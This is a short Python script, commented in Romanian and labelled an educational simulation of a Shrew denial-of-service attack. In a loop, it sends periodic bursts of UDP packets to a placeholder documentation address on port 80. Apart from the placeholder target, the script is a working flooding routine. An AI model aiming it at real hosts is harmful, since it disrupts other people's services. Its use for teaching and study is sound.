"""
shrew_sim.py - Simulare educațională a unui atac Shrew DoS
⚠️ ATENȚIE: Doar pentru uz academic. Nu lansa acest script în rețele reale.
"""

import time
import socket

TARGET_IP = "192.0.2.1"        # IP fictiv (RFC 5737 - nu va funcționa)
TARGET_PORT = 80
BURST_DURATION = 0.1          # Durata rafalei în secunde (ex: 100ms)
BURST_INTERVAL = 1.0          # Perioada ciclului (ex: 1 sec, similar RTO)
PACKET_COUNT = 100            # Număr pachete per rafală

def send_burst():
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.setblocking(False)
        for _ in range(PACKET_COUNT):
            try:
                s.sendto(b'burst', (TARGET_IP, TARGET_PORT))
            except:
                pass

if __name__ == "__main__":
    print("Pornesc simularea (CTRL+C pentru oprire)...")
    try:
        while True:
            send_burst()
            time.sleep(BURST_INTERVAL - BURST_DURATION)
    except KeyboardInterrupt:
        print("\nSimulare oprită.")
